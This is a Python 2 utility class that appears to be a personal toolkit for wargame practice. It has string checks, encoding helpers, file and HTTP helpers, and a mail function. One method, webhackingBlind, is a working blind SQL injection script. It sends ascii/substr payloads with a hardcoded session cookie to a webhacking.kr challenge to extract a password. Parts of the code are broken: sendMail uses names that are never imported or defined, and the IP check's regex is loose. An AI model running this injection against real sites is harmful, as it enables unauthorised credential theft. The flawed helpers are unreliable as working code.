#-*- coding: utf-8 -*-
__author__ = "Starleaguer (yeoung_jun@naver.com)"

import os
import re
import hashlib
import urllib2

from string import maketrans,lowercase,uppercase
# from bs4 import BeautifulSoup


class Utils(object) :
	def __init__(self) :
		return

	def __del__(self) :
		return

	############################################################
	#                     Check   Functions                    #
	############################################################
	def check_integer(self, integer):
		if re.match("^[0-9]+$", integer) == None :
			return False
		else :
			return True

	def check_string(self, string):
		if re.match("^[a-zA-Z0-9:_\x2F\x2E\x2D]+$", string) == None :
			return False
		else :
			return True

	def check_ip(self, ip):
		result = re.match("\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", ip)
		if result == None or result == '' :
			return False
		else :
			return True


	############################################################
	#                      Data   Functions                    #
	############################################################
	def xorData(self,data,hex):
		result = ''
		for i in data:
			result += chr(ord(i)^hex)
		return result

	def rot13(self,data):
	    for i in xrange(-13,13): 
	        table=maketrans(lowercase+uppercase,lowercase[i:]+lowercase[:i]+uppercase[i:]+uppercase[:i])
	        print i, data.translate(table)

	def data_hash(self, enc, data) :
		data_hash = hashlib.new(enc)
		data_hash.update(data)
		return data_hash.hexdigest()		

	############################################################
	#                      File   Functions                    #
	############################################################
	def makeFile(self,path, data):
		apath = os.path.abspath(path)
		p ,f = os.path.split(apath)
		self.mkdirRecursive(p)
		if os.path.exists(apath):
			f = "new_"+f
		fd = open(os.path.join(p,f),'w')
		fd.write(data)
		fd.close()
		
	def mkdirRecursive(self,path):
		sub_path = os.path.dirname(path)
		if not os.path.exists(sub_path):
			self.mkdirRecursive(sub_path)
		if not os.path.exists(path):
			os.mkdir(path)


	############################################################
	#                      Web   Functions                    #
	############################################################
	def getHttpResponse(self,url):
		headers = {'User-agent':'Mozilla/11.0',
		   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		   'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
		   'Accept-Encoding': 'none',
		   'Connection': 'keep-alive'}

		res = urllib2.Request(url,None,headers)
		return urllib2.urlopen(res)
		# httpReq=urllib2.Request(url)   
		# httpReq.add_header('Cookie','PHPSESSID=ighorgdtejqofigtaeohit1cv4')  
		# httpReq.add_data('id=admin')
		# httpReq.add_data('pw=admin') 
		# httpResp=urllib2.urlopen(httpReq).read()  

	def webhackingBlind(self):
		url="http://webhacking.kr/challenge/bonus/bonus-2/index.php"   
		password=''
		hexlist = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
		for num in range(33):
			for i in hexlist:
				asc = ord(str(i))
				data = "id=admin' and ascii(substr(pw,%d,1))=%d#&pw=asd" %(num,asc)
				httpReq=urllib2.Request(url)   
				httpReq.add_header('Cookie','PHPSESSID=iv9vet0f8ad2i2edfdahdegld5')  
				httpReq.add_data(data)
				httpResp=urllib2.urlopen(httpReq).read()  
				if httpResp.find('Wrong!') < 0:
					password += chr(asc)
					print "index: %d, asc: %s , password: %s" %(num,chr(asc),password)
					break

	def sendMail(self,ID,PASSWD,recv,text):
		mailID = ID+"@gmail.com"
		msg = MIMEText(text)

		msg['Subject'] = '%s' % textfile
		msg['From'] = mailID
		msg['To'] = recv

		s = smtplib.SMTP_SSL('smtp.gmail.com',465)
		s.login(ID, PASSWD)
		s.sendmail(mailID, recv, msg.as_string())
		s.quit()

	# def parseHref(response,parse):
	# 	soup = BeautifulSoup(response.read())
	# 	for hf in soup.find_all(href=re.compile(parse)):
	# 		print str(hf)